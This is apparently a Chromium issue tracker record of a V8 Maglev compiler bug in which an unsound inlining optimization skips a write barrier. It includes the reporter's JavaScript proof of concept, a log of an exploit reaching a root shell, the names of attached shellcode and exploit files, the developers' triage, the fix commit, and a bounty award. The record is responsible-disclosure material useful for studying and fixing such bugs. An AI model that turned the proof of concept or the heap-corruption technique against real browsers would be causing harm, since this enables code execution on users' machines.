# Maglev: unsound node replacement when inlining can lead to exploitable write barrier omission

| Field | Value |
|-------|-------|
| **Issue ID** | [493534950](https://issues.chromium.org/issues/493534950) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Maglev |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | pj...@gmail.com |
| **Assignee** | dm...@chromium.org |
| **Created** | 2026-03-17 |
| **Bounty** | $55,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

VULNERABILITY DETAILS

Maglev: unsound node replacement when inlining can lead to exploitable write barrier omission

The caller can first build a Smi only proof on a call result with `CheckedSmiUntag`, and then specialize a later property store to `StoreTaggedFieldNoWriteBarrier` based on that Smi fact.

The inlined callee can independently create a weaker cached `int32` alternative for the same tagged value via `CheckedNumberToInt32`. For example, in `MaglevReducer<BaseT>::GetInt32`, when `can_be_heap_number == true`, a tagged value that can still be a `HeapNumber` creates and caches `CheckedNumberToInt32`:

```
if (can_be_heap_number &&
    !known_node_aspects().CheckType(broker(), value, NodeType::kSmi)) {
  return alternative.set_int32(
      AddNewNodeNoInputConversion<CheckedNumberToInt32>({value}));
}

```

Both `CheckedSmiUntag` and `CheckedNumberToInt32` are recorded in the same cached `alternative.int32` slot in KNA.

```
PROCESS_SAFE_CONV(CheckedSmiUntag, int32, Smi)
PROCESS_SAFE_CONV(CheckedNumberToInt32, int32, Number)

```

`MaglevGraphOptimizer::VisitCheckedSmiUntag` then reuses that cached `int32` alternative and replaces the original tagged-Smi proof.

That replacement is unsound: the replacement path only checks that the converted `int32` fits the Smi payload range of `CheckedSmiSizedInt32`, not that the original tagged value is actually a Smi.

```
MaybeReduceResult MaglevGraphOptimizer::GetUntaggedValueWithRepresentation(
    ValueNode* node, UseRepresentation use_repr,
    std::optional<TaggedToFloat64ConversionType> conversion_type) {
  DCHECK_NE(use_repr, UseRepresentation::kTagged);
  if (node->value_representation() == ValueRepresentationFromUse(use_repr)) {
    return node;
  }
  if (node->Is<ReturnedValue>()) {
    ValueNode* input = node->input_node(0);
    return GetUntaggedValueWithRepresentation(input, use_repr, conversion_type);
  }
  if (ValueNode* cst =
          GetConstantWithRepresentation(node, use_repr, conversion_type)) {
    return cst;
  }
  if (node->is_tagged()) {
    NodeInfo* node_info =
        known_node_aspects().GetOrCreateInfoFor(broker(), node);
    auto& alternative = node_info->alternative();
    if (ValueNode* alt = alternative.get(use_repr)) return alt;
    return {};
  }
  if (!current_node_->properties().has_eager_deopt_info()) {
    return {};
  }
  switch (use_repr) {
    case UseRepresentation::kInt32:
      return reducer_.GetInt32(node);
  }
  UNREACHABLE();
}

ProcessResult MaglevGraphOptimizer::VisitCheckedSmiUntag(
    CheckedSmiUntag* node, const ProcessingState& state) {
  MaybeReduceResult maybe_input = GetUntaggedValueWithRepresentation(
      node->input_node(0), UseRepresentation::kInt32, {});
  if (maybe_input.IsDoneWithValue()) {
    ValueNode* input = maybe_input.value();
    if (SmiValuesAre31Bits()) {
      ReduceResult result = reducer_.BuildCheckedSmiSizedInt32(input);
      CHECK(result.IsDone());
    }
    return ReplaceWith(input);
  } else if (maybe_input.IsDoneWithAbort()) {
    return ProcessResult::kTruncateBlock;
  }
  DCHECK(maybe_input.IsFail());
  return ProcessResult::kContinue;
}


```

As a result, a small integral `HeapNumber` such as `13` can pass the compare path through `CheckedNumberToInt32 + CheckedSmiSizedInt32`, while the later property store still writes the original tagged value through `StoreTaggedFieldNoWriteBarrier`. That is,

```
16/43: CheckedNumberToInt32 [v12/n2] -> v16/n43
18/45: CheckedSmiSizedInt32 [v16/n43]
22/23: StoreTaggedFieldNoWriteBarrier(..., v12/n2)

```

Considering the following JavaScript code:

```
let captured = 0;
const holder = {a: 1};

function g(x) {
  let t = 0;
  t += 1; t += 2; t += 3; t += 4; t += 5;
  t += 6; t += 7; t += 8; t += 9; t += 10;
  t += 11; t += 12; t += 13; t += 14;
  captured = x;
  return x;
}

function f(x) {
  const y = g(x);
  return y < 0 ? -1 : (holder.a = y, holder.a);
}

```

If `f` is warmed up with Smis, the compare feedback stays in `SignedSmall` territory and `holder.a` remains Smi-specialized. Immediately before optimization, assigning `0x40000000` to `captured` widens that context slot to `Int32`, so the inlined helper contributes `CheckedNumberToInt32(x)`. Finally, `let a = 13.5; const h = a - 0.5;` produces the integral numeric value `13` as a primitive `HeapNumber` on the observed build. With non eager inlining enabled, Maglev combines the caller side `CheckedSmiUntag` and the callee side `CheckedNumberToInt32` in the same optimized graph and weakens the original proof exactly as described above.

The following POC demonstrates the issue on the current x64 debug build and run with

```
./out.gn/x64.debug/d8 \
  --allow-natives-syntax \
  --maglev-non-eager-inlining poc.js

```
```
let captured = 0;
const holder = { a: 1 };

function g(x) {
  let t = 0;
  t += 1; t += 2; t += 3; t += 4; t += 5;
  t += 6; t += 7; t += 8; t += 9; t += 10;
  t += 11; t += 12; t += 13; t += 14;
  captured = x;
  return x;
}

function f(x) {
  const y = g(x);
  return y < 0 ? -1 : (holder.a = y, holder.a);
}

%PrepareFunctionForOptimization(f);
for (let i = 0; i < 20; i++) f(1);

captured = 0x40000000;
%OptimizeMaglevOnNextCall(f);

let a = 13.5;
const h = a - 0.5;
f(h);

```

This triggers:

```
Fatal error in ../../src/heap/heap.cc
Check failed: !WriteBarrier::IsRequired(heap_object, Tagged<Object>(value)).

```

In release builds the same bug creates an untracked pointer. `holder` can be promoted to old space, and the vulnerable path then stores a young `HeapNumber` into `holder.a`. A later GC can move or reclaim that `HeapNumber` while the old object still contains the stale pointer, resulting in real heap corruption.

EXPLOIT

We would also like to provide an exploit demonstrating the impact of this vulnerability. With simple heap grooming, the stale pointer can be turned into a fake array easily. `getshell.js` is attached.

```
out.gn/x64.release/d8 --allow-natives-syntax --expose-gc --maglev-non-eager-inlining exp.js
[*] Exploit by Project WhatForLunch
[+] oob array length: 0x25788785
[+] cage base: 0x5c00000000
[+] partition alloc: 0x21ec00004000
[+] code ptr table: 0x7fe7389dc000
[+] dispatch handle: 0x135d00, table offset: 0x135d0
[+] rwx addr: 0x556289244f00
[+] 🥱 get shell
sh-5.3# echo pwned
pwned
sh-5.3# 

```

VERSION

Commit: 371bdd84eb76807d4362faf112ef247b6aa54960 (Wed Mar 14 09:04:16 2026)

Bisect: commit introduces the problem.

REPRODUCTION CASE

`poc.js` and `getshell.js` are attached. Please run with:

```
out.gn/x64.release/d8 \
  --allow-natives-syntax \
  --expose-gc --maglev-non-eager-inlining \
  ./exp.js

```

release build was compiled with the following args.gn

```
dcheck_always_on = false
is_debug = false
target_cpu = "x64"
is_component_build = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
v8_enable_sandbox = false

```

Please attach files directly, not in zip or other archive formats, and if you've created a demonstration site please also attach the files needed to reproduce the demonstration locally.

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION

Type of crash: CHECK failure, Controlled write on release

CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?

Reporter credit: Project WhatForLunch (@pjwhatforlunch)

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 477 B)
- [getshell.js](attachments/getshell.js) (text/javascript, 32.2 KB)
- [exp.html](attachments/exp.html) (text/html, 24.5 KB)
- [exp_pop_calc_stable_release_146.html](attachments/exp_pop_calc_stable_release_146.html) (text/html, 17.1 KB)
- [release_chrome_pop_calc.mov](attachments/release_chrome_pop_calc.mov) (video/quicktime, 2.8 MB)
- [shellcode_b64](attachments/shellcode_b64) (application/octet-stream, 820 B)

## Timeline

### dr...@chromium.org (2026-03-17)

Provisionally forwarding to V8 folks to investigate

### cl...@appspot.gserviceaccount.com (2026-03-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6381121361182720.

### dm...@chromium.org (2026-03-18)

Thanks for the report.

`--maglev-non-eager-inlining` is

- disabled by default for Maglev.
- enabled for Turbolev, but Turbolev itself is disabled by default.

==> impact is None.

This is similar in spirit to [Issue 490136930](https://issues.chromium.org/issues/490136930) and [Issue 490847000](https://issues.chromium.org/issues/490847000) (but different enough to be a separate bug): we make assumptions during graph building that we don't record, and we break them later. I'll take this bug so that I can try to figure a solution that works those 3 bugs..

### 24...@project.gserviceaccount.com (2026-03-18)

Detailed Report: https://clusterfuzz.com/testcase?key=6381121361182720

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: CHECK failure
Crash Address: 
Crash State:
  r.IsSmi() implies IsSmi(value)
  v8::internal::JSObject::JSObjectVerify
  v8::internal::HeapObject::HeapObjectVerify
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8&range=103389:103390

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6381121361182720

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### ch...@google.com (2026-03-18)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-03-18)

Setting Priority to P1 to match Severity s1. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### dm...@chromium.org (2026-03-18)

Very slightly modified repro:

```
let int32_context_cell = 42;
int32_context_cell = 0x40000000; // Making it non-smi but still int32

const obj = { x : 42 };

function g(x) {
  // Preventing eager inlining.
  let t = 0;
  t += 1; t += 2; t += 3; t += 4; t += 5;
  t += 6; t += 7; t += 8; t += 9; t += 10;
  t += 11; t += 12; t += 13; t += 14;

  // Introducing a CheckedNumberToInt32.
  int32_context_cell = x;

  return x;
}

function f(x) {
  const y = g(x);

  // Inserting a CheckedSmiUntag so that `obj.x = y` doesn't insert a CheckSmi.
  y | 0;

  obj.x = y;
}

%PrepareFunctionForOptimization(g);
%PrepareFunctionForOptimization(f);
f(17);

%OptimizeMaglevOnNextCall(f);
f(17);

f(%AllocateHeapNumberWithValue(42));

```

It's easy to fix this issue by removing the optimization from `MaglevGraphOptimizer::VisitCheckedSmiUntag`, but since phi untagging has similar issues, I'd like to think a bit more before doing anything.

### pj...@gmail.com (2026-03-18)

Commit `1311512f6961bc4af19f56885475eed9f4880919` (Wed Oct 29 05:38:48 2025 -0700) added tagged-node alternative reuse. And then `MaglevGraphOptimizer::VisitCheckedSmiUntag` can replace node with a weaker one.

### 24...@project.gserviceaccount.com (2026-04-02)

ClusterFuzz testcase 6381121361182720 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8&range=106198:106199

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### dx...@google.com (2026-04-07)

Project: v8/v8  

Branch:  main  

Author:  Victor Gomes [victorgomes@chromium.org](mailto:victorgomes@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7734955>

[turbolev] Disable CheckedSmiUntag optimization in Graph Optimizer

---


Expand for full commit details
```
     
    Fixed: 493534950 
    Change-Id: I94e3a9db4084cead8b384e79e45c7d0b3ef8ac49 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7734955 
    Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
    Commit-Queue: Victor Gomes <victorgomes@chromium.org> 
    Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
    Auto-Submit: Victor Gomes <victorgomes@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#106291}

```

---

Files:

- M `src/maglev/maglev-graph-optimizer.cc`
- A `test/mjsunit/turbolev/regress-493534950.js`

---

Hash: [103fea9ab5cc7e5bfe17658a8231f8289e1ac36f](https://chromiumdash.appspot.com/commit/103fea9ab5cc7e5bfe17658a8231f8289e1ac36f)  

Date: Tue Apr 7 15:16:10 2026


---

### pj...@gmail.com (2026-04-27)

We would like to show the exploit with chrome as well, the attached file demonstrate fakeobj primitive at any address. Please run with

```
/opt/chrome-linux64/chrome --headless=new --no-sandbox --disable-crashpad --disable-breakpad --disable-crash-reporter --enable-logging=stderr --user-data-dir=/home/user --js-flags="--allow-natives-syntax --expose-gc --maglev-non-eager-inlining"

```

### pj...@gmail.com (2026-05-04)

We would like to provide further exploit chained with v8 sandbox bypass on stable release Chrome 146. Please run with:

```
/opt/chrome-linux64/chrome --headless=new --no-sandbox --disable-crashpad --disable-breakpad --disable-crash-reporter --enable-logging=stderr --user-data-dir=/home/user --js-flags="--allow-natives-syntax --expose-gc --maglev-non-eager-inlining"

```

**Note :** Please host `shellcode_b64` in the same directory.

### sp...@google.com (2026-05-14)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $55000.00 for this report.

Rationale for this decision:
High Quality with Functional Exploit - Renderer RCE / memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-07-10)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/493534950)*
